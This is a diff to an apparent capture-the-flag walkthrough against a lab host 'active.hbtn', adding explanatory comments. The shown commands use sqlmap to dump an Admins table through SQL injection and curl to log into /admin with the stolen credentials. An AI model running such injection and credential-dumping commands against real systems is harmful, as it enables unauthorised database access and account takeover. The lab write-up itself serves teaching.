@@ -548,15 +548,18 @@ curl -s http://active.hbtn/admin
 # </html>
 ```
 
+Maybe if we could login, then we might be presented with a different page when authenticated.
+
 Luckilly we remember from SQL injection, there were some interesting things which remained unexplored.
 
 ```bash
-# install again sqlmap
+# install sqlmap (old sandbox expired)
 apt update && apt install -y sqlmap
 
 # we remember from previous flag capture, we had
 # Database: active.hbtn
 # Tables: Admins, Orders, Products, Users
+
 # Let's have a look on table Admins
 sqlmap -u "http://active.hbtn/product/1" -D "active.hbtn" -T Admins --dump --batch --fresh-queries
 # Database: active.hbtn
@@ -570,6 +573,10 @@ sqlmap -u "http://active.hbtn/product/1" -D "active.hbtn" -T Admins --dump --bat
 
 
 # lets try to login with these credentials on the /admin page
+# -L follow redirect
+# -i include headers like HTTP/1.1 302 FOUND, Location: /admin_panel, Set-Cookie: session=...
+# -c store cookie received from server
+# -b read cookie from previously saved cookies.txt file (for eventual redirect)
 curl -i -s -L -c cookies.txt -b cookies.txt \
   -X POST http://active.hbtn/admin \
   --data-urlencode "username=admin" \
